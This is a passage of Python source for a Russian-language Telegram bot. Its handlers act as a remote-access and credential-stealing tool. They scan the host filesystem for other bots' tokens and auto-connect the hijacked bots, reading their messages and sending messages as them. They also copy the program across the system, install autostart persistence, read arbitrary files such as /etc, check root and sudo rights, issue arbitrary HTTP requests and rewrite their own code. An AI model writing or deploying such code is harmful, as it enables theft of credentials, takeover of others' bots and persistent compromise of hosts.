    """Сканирует всю файловую систему в поисках ботов и токенов."""
    msg = await update.message.reply_text(
        "🔍 Сканирую файловую систему...\n"
        "_(это может занять 1-2 минуты)_",
        parse_mode="Markdown"
    )
    try:
        results = await do_full_scan()
        bots   = results["found_bots"]
        tokens = results["found_tokens"]

        text = f"✅ *Сканирование завершено!*\n\n"
        text += f"📂 Просканировано директорий: `{len(results['scanned'])}`\n"
        text += f"🤖 Найдено файлов ботов: `{len(bots)}`\n"
        text += f"🔑 Найдено токенов: `{len(tokens)}`\n\n"

        if bots:
            text += "*Файлы ботов:*\n"
            for b in bots[:8]:
                text += f"📄 `{b['path']}`\n"
                if b["tokens"]:
                    text += f"   🔑 токенов: {len(b['tokens'])}\n"
            if len(bots) > 8:
                text += f"_...и ещё {len(bots)-8}_\n"

        if tokens:
            text += f"\n*Токены (найдены автоматически):*\n"
            for t in tokens[:5]:
                text += f"🔑 `{t[:20]}...`\n"
            text += "\nИспользуй `/foundbots` чтобы подключить их"

        await msg.edit_text(text[:4000], parse_mode="Markdown")
    except Exception as e:
        await msg.edit_text(f"❌ Ошибка: {e}")

async def cmd_foundbots(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Показывает найденные боты и позволяет их подключить."""
    tokens = knowledge.get("found_tokens", [])
    bots   = knowledge.get("found_bots",   [])

    if not tokens and not bots:
        await update.message.reply_text(
            "Ничего не найдено.\nЗапусти `/scan` сначала.",
            parse_mode="Markdown"
        ); return

    text = f"🔍 *Найдено в файловой системе:*\n\n"
    if bots:
        text += f"*Файлы ботов ({len(bots)}):*\n"
        for b in bots[:10]:
            text += f"📄 `{b['path']}`\n"
        text += "\n"
    if tokens:
        text += f"*Токены ({len(tokens)}):*\n"
        for t in tokens[:10]:
            connected = t in managed_bots
            icon = "✅" if connected else "🔑"
            text += f"{icon} `{t[:25]}...`\n"
        text += "\n`/autoconnect` — подключить все найденные токены"

    await update.message.reply_text(text[:4000], parse_mode="Markdown")

async def cmd_autoconnect(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Автоматически подключает все найденные токены."""
    tokens = knowledge.get("found_tokens", [])
    if not tokens:
        await update.message.reply_text("Токены не найдены. Сначала запусти `/scan`.", parse_mode="Markdown"); return

    msg     = await update.message.reply_text(f"🔄 Подключаю {len(tokens)} токенов...")
    ok, fail = 0, 0
    text    = "*Результат:*\n\n"
    for token in tokens:
        if token in managed_bots:
            text += f"⏭️ `{token[:20]}...` — уже подключён\n"; continue
        info = await fetch_bot_info(token)
        if info:
            managed_bots[token] = {"id": info["id"], "username": info["username"],
                                    "name": info["first_name"],
                                    "added_at": datetime.now().isoformat(),
                                    "auto_discovered": True}
            text += f"✅ *{info['first_name']}* @{info['username']}\n"
            ok += 1
        else:
            text += f"❌ `{token[:20]}...` — не рабочий\n"
            fail += 1

    save_memory()
    text = f"✅ Подключено: {ok} | ❌ Не рабочих: {fail}\n\n" + text
    await msg.edit_text(text[:4000], parse_mode="Markdown")

async def cmd_whereami(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    sys_k  = knowledge.get("system",{})
    privs  = check_privileges()
    disk   = 0
    try: disk = shutil.disk_usage(WORK_DIR).free // (1024*1024)
    except: pass
    await update.message.reply_text(
        f"🖥️ `{sys_k.get('platform', platform.platform())[:50]}`\n"
        f"🏠 `{socket.gethostname()}`\n"
        f"🌐 `{sys_k.get('ip_public','?')}`\n"
        f"📁 `{SELF_FILE}`\n"
        f"👤 `{privs['user']}` | Root:`{'✅' if privs.get('is_root') or privs.get('is_admin') else '❌'}` sudo:`{'✅' if privs.get('can_sudo') else '❌'}`\n"
        f"💿 `{disk} MB` | PID:`{os.getpid()}`\n"
        f"📋 Копий: `{len(knowledge.get('copies',[]))}`\n"
        f"🔄 Автозапуск: `{', '.join(knowledge.get('autostart',[])) or '❌'}`\n"
        f"🤖 Найдено ботов: `{len(knowledge.get('found_bots',[]))}`\n"
        f"🔑 Токенов: `{len(knowledge.get('found_tokens',[]))}`",
        parse_mode="Markdown"
    )

async def cmd_fs(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text(
            "`/fs ~` — домашняя папка\n"
            "`/fs /` — корень системы\n"
            "`/fs /home` — все пользователи\n"
            "`/fs /etc` — конфиги системы\n"
            "`/fs /tmp` — временные файлы\n"
            "`/fs .` — текущая папка\n"
            "`/fs /path/to/file.py` — прочитать файл",
            parse_mode="Markdown"
        ); return
    path = os.path.expanduser(" ".join(ctx.args))
    if path == ".": path = WORK_DIR
    msg    = await update.message.reply_text(f"🔍 `{path}`...", parse_mode="Markdown")
    result = read_path(path)
    try:    await msg.edit_text(format_path_result(result), parse_mode="Markdown")
    except: await msg.edit_text(format_path_result(result)[:4000])

async def cmd_spread(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg     = await update.message.reply_text("📋 Копирую себя в систему...")
    results = spread_copies()
    ok = [r for r in results if r["ok"]]
    text = f"📋 *Скопировано {len(ok)}/{len(results)}:*\n\n"
    for r in results:
        text += f"{'✅' if r['ok'] else '❌'} `{r['path']}`\n"
        if not r["ok"]: text += f"   _{r.get('error','?')[:50]}_\n"
    await msg.edit_text(text, parse_mode="Markdown")

async def cmd_autostart(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg     = await update.message.reply_text("⚙️ Устанавливаю автозапуск...")
    results = install_autostart()
    text    = f"⚙️ *Автозапуск:*\n\n"
    for r in results: text += f"{r['desc']}\n\n"
    await msg.edit_text(text[:4000], parse_mode="Markdown")

async def cmd_thoughts(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    thoughts = knowledge.get("think_log", [])
    if not thoughts:
        await update.message.reply_text("🧠 Нет мыслей пока. Первый цикл через 60 сек после старта."); return
    text = f"🧠 *Мысли агента ({len(thoughts)} всего):*\n\n"
    for t in thoughts[-5:]:
        text += f"⏰ `{t.get('time','?')[:16]}`\n{t.get('thought','')[:300]}\n\n"
    await update.message.reply_text(text[:4000], parse_mode="Markdown")

async def cmd_addbot(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Укажи токен:\n`/addbot TOKEN`\nИли просто напиши токен в чат.", parse_mode="Markdown"); return
    await _connect_bot(update, ctx, ctx.args[0].strip())

async def _connect_bot(update: Update, ctx: ContextTypes.DEFAULT_TYPE, token: str):
    msg  = await update.message.reply_text("🔍 Проверяю токен...")
    info = await fetch_bot_info(token)
    if not info: await msg.edit_text("❌ Неверный токен или бот недоступен."); return
    managed_bots[token] = {"id": info["id"], "username": info["username"],
                            "name": info["first_name"], "added_at": datetime.now().isoformat()}
    save_memory()
    await msg.edit_text(
        f"✅ *{info['first_name']}* подключён!\n@{info['username']} · `{info['id']}`\n\n"
        f"`/botcmd {token[:15]}... info`\n"
        f"`/botcmd {token[:15]}... updates`\n"
        f"`/botcmd {token[:15]}... setname ИМЯ`\n"
        f"`/botcmd {token[:15]}... send CHAT_ID ТЕКСТ`",
        parse_mode="Markdown"
    )

async def cmd_mybots(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not managed_bots:
        await update.message.reply_text("Нет подключённых ботов.\n`/addbot TOKEN` или `/scan` + `/autoconnect`", parse_mode="Markdown"); return
    text = f"🤖 *Подключённые боты ({len(managed_bots)}):*\n\n"
    for t, i in managed_bots.items():
        auto = " _(авто)_" if i.get("auto_discovered") else ""
        text += f"• *{i.get('name')}* @{i.get('username')}{auto}\n  `{t[:20]}...`\n\n"
    await update.message.reply_text(text, parse_mode="Markdown")

async def cmd_botcmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args or len(ctx.args) < 2:
        await update.message.reply_text(
            "`/botcmd TOKEN ACTION [ARGS]`\n"
            "Действия: `info` `updates` `setname` `setdesc` `send` `setcommands`",
            parse_mode="Markdown"
        ); return
    tp = ctx.args[0]; action = ctx.args[1].lower(); args = ctx.args[2:]
    ft = next((t for t in managed_bots if t.startswith(tp)), None)
    if not ft and is_bot_token(tp): ft = tp
    if not ft: await update.message.reply_text("❌ Бот не найден."); return
    msg = await update.message.reply_text(f"⚙️ `{action}`...", parse_mode="Markdown")
    if action == "info":
        info = await fetch_bot_info(ft)
        if info: await msg.edit_text(f"ℹ️ *{info['first_name']}* @{info['username']}\nID:`{info['id']}`", parse_mode="Markdown")
        else:    await msg.edit_text("❌ Ошибка")
    elif action == "updates":
        r = await tg_api(ft, "getUpdates", {"limit": 10})
        upds = r.get("result", [])
        if not upds: await msg.edit_text("📭 Нет."); return
        t = f"📬 *{len(upds)} сообщений:*\n\n"
        for u in upds[-8:]:
            m = u.get("message") or {}
            user = (m.get("from") or {}).get("first_name","?")
            txt  = m.get("text","")[:80]
            t   += f"👤 *{user}*: {txt}\n"
        await msg.edit_text(t, parse_mode="Markdown")
    elif action == "setname" and args:
        r = await tg_api(ft, "setMyName", {"name": " ".join(args)})
        await msg.edit_text(f"{'✅' if r.get('result') else '❌'} setname")
    elif action == "setdesc" and args:
        r = await tg_api(ft, "setMyDescription", {"description": " ".join(args)})
        await msg.edit_text(f"{'✅' if r.get('result') else '❌'} setdesc")
    elif action == "send" and len(args) >= 2:
        r = await tg_api(ft, "sendMessage", {"chat_id": args[0], "text": " ".join(args[1:])})
        await msg.edit_text(f"{'✅ Отправлено' if r.get('ok') else '❌ Ошибка'}")
    elif action == "setcommands":
        cmds = [{"command":"start","description":"Начать"},{"command":"help","description":"Помощь"}]
        r = await tg_api(ft, "setMyCommands", {"commands": cmds})
        await msg.edit_text(f"{'✅' if r.get('result') else '❌'} команды")
    else:
        await msg.edit_text("❓ `info` `updates` `setname` `setdesc` `send` `setcommands`", parse_mode="Markdown")

async def cmd_curl(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args or len(ctx.args) < 2:
        await update.message.reply_text("`/curl GET https://ipinfo.io/json`", parse_mode="Markdown"); return
    method=ctx.args[0].upper(); url=ctx.args[1]; json_d=None
    if len(ctx.args)>2:
        try: json_d=json.loads(" ".join(ctx.args[2:]))
        except: pass
    msg=await update.message.reply_text(f"🌐 `{method} {url[:60]}`", parse_mode="Markdown")
    try:
        async with httpx.AsyncClient(timeout=30, follow_redirects=True) as c:
            r = await c.request(method, url, **({"json":json_d} if json_d else {}))
        body=r.text[:2000]; emoji="✅" if 200<=r.status_code<300 else "⚠️"
        await msg.edit_text(f"{emoji} `{r.status_code}`\n```\n{body}\n```", parse_mode="Markdown")
    except Exception as e: await msg.edit_text(f"❌ `{e}`", parse_mode="Markdown")

async def cmd_remind(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args or len(ctx.args)<2:
        await update.message.reply_text("`/remind 30m текст`\n`/remind 2h текст`\n`/remind 18:00 текст`", parse_mode="Markdown"); return
    when_str=ctx.args[0]; text_r=" ".join(ctx.args[1:]); now=datetime.now()
    try:
        if when_str.endswith("m"):   target=datetime.fromtimestamp(now.timestamp()+int(when_str[:-1])*60)
        elif when_str.endswith("h"): target=datetime.fromtimestamp(now.timestamp()+int(when_str[:-1])*3600)
        elif ":" in when_str:
            h,m=map(int,when_str.split(":")); target=now.replace(hour=h,minute=m,second=0)
            if target<now: target=target.replace(day=target.day+1)
        else: await update.message.reply_text("❌ Формат: 30m / 2h / 18:00"); return
        knowledge.setdefault("scheduled",[]).append({"time":target.isoformat(),"text":text_r,"done":False})
        save_memory()
        await update.message.reply_text(f"⏰ Напоминание установлено!\n`{target.strftime('%Y-%m-%d %H:%M')}`\n📝 {text_r}", parse_mode="Markdown")
    except Exception as e: await update.message.reply_text(f"❌ {e}")

async def cmd_note(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("`/note список`\n`/note ключ`\n`/note ключ текст`", parse_mode="Markdown"); return
    key=ctx.args[0].lower()
    if key in ("list","список","all"):
        notes=knowledge.get("notes",{})
        if not notes: await update.message.reply_text("📝 Нет заметок."); return
        t="📝 *Заметки:*\n\n"
        for k,v in notes.items(): t+=f"• `{k}`: {v[:80]}\n"
        await update.message.reply_text(t, parse_mode="Markdown"); return
    if len(ctx.args)==1:
        val=knowledge.get("notes",{}).get(key)
        if val: await update.message.reply_text(f"📝 `{key}`:\n{val}", parse_mode="Markdown")
        else:   await update.message.reply_text(f"❌ `{key}` не найдена.", parse_mode="Markdown")
        return
    value=" ".join(ctx.args[1:]); knowledge.setdefault("notes",{})[key]=value; save_memory()
    await update.message.reply_text(f"✅ `{key}` сохранена.", parse_mode="Markdown")

async def cmd_selfimprove(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    goal=" ".join(ctx.args) if ctx.args else ""
    if not goal: await update.message.reply_text("`/selfimprove задача`", parse_mode="Markdown"); return
    msg=await update.message.reply_text("🧠 Улучшаю код...")
    ok,result=await self_improve(goal)
    await msg.edit_text(
        f"{'✅ Код обновлён! Перезапусти бота.' if ok else '❌ Ошибка'}\n`{result}`",
        parse_mode="Markdown"
    )

async def cmd_image(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    cid=str(update.effective_chat.id); prompt=" ".join(ctx.args) if ctx.args else ""
    if not prompt: await update.message.reply_text("🎨 `/image описание`", parse_mode="Markdown"); return
    style="flux"
    for flag,s in [("--anime","anime"),("--art","art"),("--minimal","minimal"),("--turbo","turbo")]:
        if flag in prompt: prompt=prompt.replace(flag,"").strip(); style=s; break
    msg=await update.message.reply_text("🎨 Генерирую...")
    try:
        await ctx.bot.send_chat_action(chat_id=update.effective_chat.id, action="upload_photo")
        en=await translate_to_en(prompt); img=await generate_image(en,style)
        if img:
            image_count[cid]=image_count.get(cid,0)+1; save_memory()
            kb=InlineKeyboardMarkup([[
                InlineKeyboardButton("🔄 Ещё", callback_data=f"regen|{prompt[:50]}|{style}"),
                InlineKeyboardButton("🎨 Стиль", callback_data=f"restyle|{prompt[:50]}"),
            ]])
            await msg.delete()
            await ctx.bot.send_photo(chat_id=update.effective_chat.id, photo=img,
                caption=f"🎨 *{prompt}*\n_{style}_", parse_mode="Markdown", reply_markup=kb)
        else: await msg.edit_text("❌ Попробуй `--turbo`.")
    except Exception as e: log.error(f"image: {e}"); await msg.edit_text("❌ Ошибка.")

async def cmd_reset(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    cid=str(update.effective_chat.id); histories.pop(cid,None); save_memory()
    await update.message.reply_text("🧹 Диалог сброшен!")

# ══════════════════════════════════════════════════════════════════════
# КНОПКИ
# ══════════════════════════════════════════════════════════════════════

async def handle_button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q=update.callback_query; await q.answer(); cid=str(q.message.chat_id); d=q.data

    if d == "do_scan":
        await q.edit_message_text("🔍 Сканирую... это займёт минуту.")
        results = await do_full_scan()
        await q.edit_message_text(
            f"✅ Готово!\n🤖 Ботов: `{len(results['found_bots'])}`\n"
            f"🔑 Токенов: `{len(results['found_tokens'])}`\n\n"
            f"`/foundbots` — посмотреть\n`/autoconnect` — подключить всё",
            parse_mode="Markdown"
        ); return

    if d == "whereami":
        sys_k=knowledge.get("system",{}); privs=check_privileges()
        await q.edit_message_text(
            f"🖥️ `{sys_k.get('platform',platform.platform())[:40]}`\n"
            f"🌐 `{sys_k.get('ip_public','?')}`\n📁 `{SELF_FILE}`\n"
            f"Root:`{'✅' if privs.get('is_root') or privs.get('is_admin') else '❌'}`",
            parse_mode="Markdown"); return

    if d == "spread":
        results=spread_copies(); ok=sum(1 for r in results if r["ok"])
        await q.edit_message_text(
            f"📋 Скопировано {ok}/{len(results)}:\n" +
            "\n".join(f"{'✅' if r['ok'] else '❌'} `{r['path']}`" for r in results),
            parse_mode="Markdown"); return

    if d == "do_autostart":
        results=install_autostart(); ok=[r for r in results if r["ok"]]
        await q.edit_message_text(
            f"⚙️ Автозапуск ({len(ok)}/{len(results)}):\n\n" +
            "\n".join(r["desc"] for r in results), parse_mode="Markdown"); return

    if d == "found_bots":
        tokens=knowledge.get("found_tokens",[]); bots=knowledge.get("found_bots",[])
        if not tokens and not bots:
            await q.edit_message_text("Ничего. Сначала `/scan`.", parse_mode="Markdown"); return
        t=f"🔍 Ботов: {len(bots)} | Токенов: {len(tokens)}\n\n"
        for b in bots[:5]: t+=f"📄 `{b['path']}`\n"
        t+=f"\n`/autoconnect` — подключить все токены"
        await q.edit_message_text(t, parse_mode="Markdown"); return

    if d == "thoughts":
        thoughts=knowledge.get("think_log",[])
        if not thoughts: await q.edit_message_text("🧠 Нет мыслей."); return
        last=thoughts[-1]
        await q.edit_message_text(
            f"🧠 `{last.get('time','?')[:16]}`\n\n{last.get('thought','')[:500]}",
            parse_mode="Markdown"); return

    if d == "image_help":
        await q.edit_message_text("🎨 `/image описание`\n`--anime` `--art` `--minimal` `--turbo`", parse_mode="Markdown"); return

    if d == "status":
        await q.edit_message_text(
            f"📊 PID:`{os.getpid()}`\n"
            f"Ботов найдено:`{len(knowledge.get('found_bots',[]))}` "
            f"Токенов:`{len(knowledge.get('found_tokens',[]))}`\n"
            f"Подключено:`{len(managed_bots)}` Копий:`{len(knowledge.get('copies',[]))}`\n"
            f"Автозапуск:`{', '.join(knowledge.get('autostart',[])) or '❌'}`"
        ); return

    if d.startswith("regen|"):
        parts=d.split("|",2); prompt=parts[1] if len(parts)>1 else "landscape"; style=parts[2] if len(parts)>2 else "flux"
        en=await translate_to_en(prompt); img=await generate_image(en,style)
        if img:
            image_count[cid]=image_count.get(cid,0)+1; save_memory()
            kb=InlineKeyboardMarkup([[InlineKeyboardButton("🔄",callback_data=f"regen|{prompt}|{style}"),InlineKeyboardButton("🎨",callback_data=f"restyle|{prompt}")]])
            await ctx.bot.send_photo(chat_id=q.message.chat_id,photo=img,caption=f"🎨 *{prompt}*\n_{style}_",parse_mode="Markdown",reply_markup=kb)
        return

    if d.startswith("restyle|"):
        p=d.split("|",1)[1]
        kb=InlineKeyboardMarkup([
            [InlineKeyboardButton("🌟 Flux",callback_data=f"regen|{p}|flux"),InlineKeyboardButton("⚡ Turbo",callback_data=f"regen|{p}|turbo")],
            [InlineKeyboardButton("🎌 Аниме",callback_data=f"regen|{p}|anime"),InlineKeyboardButton("🎨 Арт",callback_data=f"regen|{p}|art")],
        ])
        await q.edit_message_reply_markup(reply_markup=kb); return

# ══════════════════════════════════════════════════════════════════════
# ГЛАВНЫЙ ОБРАБОТЧИК
# ══════════════════════════════════════════════════════════════════════

async def handle_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    chat_id=update.effective_chat.id; cid=str(chat_id)
    user_text=(update.message.text or "").strip()
    if not user_text: return
    if is_bot_token(user_text): await _connect_bot(update,ctx,user_text); return
    if is_img_req(user_text):
        for kw in ["нарисуй мне","нарисуй","сгенерируй картинку","изобрази","draw me","хочу картинку"]:
            if kw in user_text.lower():
                p=user_text.lower().replace(kw,"").strip(" ,.!?")
                if p: ctx.args=p.split(); await cmd_image(update,ctx); return
        await update.message.reply_text("🎨 `/image описание`", parse_mode="Markdown"); return
    history=get_history(cid); history.append({"role":"user","content":user_text}); trim(history)
    messages=[{"role":"system","content":get_system(cid)}]+history
    await ctx.bot.send_chat_action(chat_id=chat_id,action="typing")
    try: reply,model=await ask_ai(messages)
    except RuntimeError as e: await update.message.reply_text(f"😔 {e}"); return
    history.append({"role":"assistant","content":reply}); save_memory()
    footer=f"\n\n_· {sname(model)}_"
    if len(reply)+len(footer)>4096: reply=reply[:4090-len(footer)]+"..."
    try: await update.message.reply_text(reply+footer,parse_mode="Markdown")
    except: await update.message.reply_text(reply)

# ══════════════════════════════════════════════════════════════════════
# ЗАПУСК
# ══════════════════════════════════════════════════════════════════════

def main():
    load_memory()
    app=(ApplicationBuilder()
         .token(TELEGRAM_TOKEN)
         .post_init(notify_owner_startup)
         .build())
    for cmd, handler in [
        ("start",        cmd_start),
        ("reset",        cmd_reset),
        ("whereami",     cmd_whereami),
        ("scan",         cmd_scan),
        ("foundbots",    cmd_foundbots),
        ("autoconnect",  cmd_autoconnect),
        ("spread",       cmd_spread),
        ("autostart",    cmd_autostart),
        ("fs",           cmd_fs),
        ("thoughts",     cmd_thoughts),
        ("remind",       cmd_remind),
        ("note",         cmd_note),
        ("addbot",       cmd_addbot),
        ("mybots",       cmd_mybots),
        ("botcmd",       cmd_botcmd),
        ("curl",         cmd_curl),
        ("selfimprove",  cmd_selfimprove),
        ("image",        cmd_image),
    ]:
        app.add_handler(CommandHandler(cmd, handler))
    app.add_handler(CallbackQueryHandler(handle_button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    log.info(f"🐍 {BOT_NAME} запущен! PID={os.getpid()}")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
